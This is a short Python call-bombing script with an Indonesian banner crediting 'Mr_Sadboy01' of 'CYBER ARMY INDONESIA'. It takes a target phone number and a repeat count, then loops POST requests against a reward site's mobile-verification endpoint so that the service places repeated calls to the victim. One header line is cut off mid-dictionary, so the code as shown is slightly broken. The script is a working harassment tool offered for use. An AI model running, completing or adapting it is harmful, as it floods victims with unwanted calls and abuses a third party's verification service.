# module
import os,sys,time,requests
from time  import sleep

# tampilan
os.system("clear")
sleep (1)
os.system("spamCall")
benner= """
==============================================
{●} Author : Mr_Sadboy01          {●}
{●} Team   : CYBER ARMY INDONESIA {●}
{●} github : Bocilhacker          {●}
=============================================="""
sleep (1)
print(benner)
nomor= input("Nomor Terget")
jumlah= int(input(",Jumlah Spam"))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'Us>
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [â€¢] Status ~+> ",(send.json()["message"]))